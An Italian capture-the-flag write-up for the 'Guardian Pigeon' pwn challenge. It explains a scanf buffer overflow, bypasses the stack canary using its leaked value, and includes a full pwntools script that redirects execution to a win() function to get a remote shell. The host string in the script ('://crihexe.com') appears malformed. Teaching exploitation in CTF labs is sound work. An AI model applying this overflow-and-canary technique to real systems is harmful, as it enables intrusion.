# Writeup: Guardian Pigeon (pwn) - CTF

## Descrizione della sfida
**Guardian Pigeon** è una sfida di categoria **pwn** focalizzata sullo sfruttamento di un **Buffer Overflow** in presenza di protezioni come lo **Stack Canary**. L'obiettivo è dirottare il flusso d'esecuzione verso una funzione non chiamata dal programma (`win`) per ottenere una shell remota.

---

## 1. Analisi Statica (Binary Ninja)
Analizzando il binario, identifichiamo tre funzioni principali:

### `main()`
Inizializza l'ambiente e invoca la funzione `play()`. Se `play()` termina correttamente, il programma stampa un messaggio di sconfitta.

### `play()`
Questa è la funzione vulnerabile. Contiene:
- Una variabile locale `var_58` (buffer nello stack).
- Una vulnerabilità di **Buffer Overflow** causata da `__isoc99_scanf("%s", &var_58)`, che legge l'input senza limiti di lunghezza.
- Una protezione **Stack Canary** attiva (`*(fsbase + 0x28)`).
- Un **Leak del Canary**: il programma stampa il valore del segreto ("ID Entità") in formato esadecimale (`%lx`) prima di chiedere l'input.

### `win()`
Funzione obiettivo (non chiamata dal codice legittimo) che esegue:
```c
execve("/bin/sh", ...);
```
Punto di ingresso (entry point): `0x40126a`.

---

## 2. Lo Stack Layout
Per costruire l'exploit, dobbiamo mappare la memoria della funzione `play()`:


| Offset (Hex) | Offset (Dec) | Contenuto | Note |
| :--- | :--- | :--- | :--- |
| `0x00` | 0 | `var_58` | Inizio del nostro input |
| `0x48` | **72** | **Stack Canary** | 8 byte (da ripristinare) |
| `0x50` | 80 | **Saved RBP** | 8 byte di padding |
| `0x58` | 88 | **Return Address (RIP)** | Dove metteremo l'indirizzo di `win` |

---

## 3. Strategia di Exploitation
Poiché il Canary cambia ad ogni esecuzione, lo script deve:
1. Connettersi al server remoto.
2. Leggere la stringa dell'output per estrarre il valore esadecimale del Canary.
3. Costruire un payload che:
   - Riempia il buffer (72 byte di padding).
   - Inserisca il Canary catturato (per non far scattare `__stack_chk_fail`).
   - Sovrascriva il Saved RBP (8 byte).
   - Sovrascriva il Return Address con l'indirizzo di `win`.

**Nota sull'allineamento:** Su Ubuntu x64, la funzione `execve` richiede che lo stack sia allineato a 16 byte. Per evitare crash, puntiamo a `win + 1` (`0x40126b`) saltando la prima istruzione `push rbp`.

---

## 4. Exploit Script (Pwntools)

```python
from pwn import *

# Setup
context.arch = 'amd64'
p = remote('://crihexe.com', 13340)

# 1. Leak Canary
p.recvuntil(b"ID Entita': ")
canary = int(p.recvline().strip(), 16)
success(f"Canary bypassato: {hex(canary)}")

# 2. Parametri Exploit
win_addr = 0x40126b # Indirizzo win+1 per allineamento stack
offset = 72         # Offset identificato da var_58

# 3. Payload Construction
payload = flat({
    offset: p64(canary),      # Ripristino Canary originale
    offset + 8: b"B" * 8,     # Padding per RBP
    offset + 16: p64(win_addr) # Dirottamento a win()
})

# 4. Attack
p.sendlineafter(b"Attacca il Guardian Pigeon: ", payload)
p.interactive()
```

---

## 5. Conclusione
Dopo l'invio del payload, il programma verifica il Canary (che abbiamo riscritto correttamente) e ritorna dalla funzione `play()`. Invece di tornare al `main`, salta alla funzione `win()`, aprendo una shell interattiva sul server.

**Flag:** `crihex{pigeon_slayed_by_canary_leak_0xdeadbeef}` (esempio)
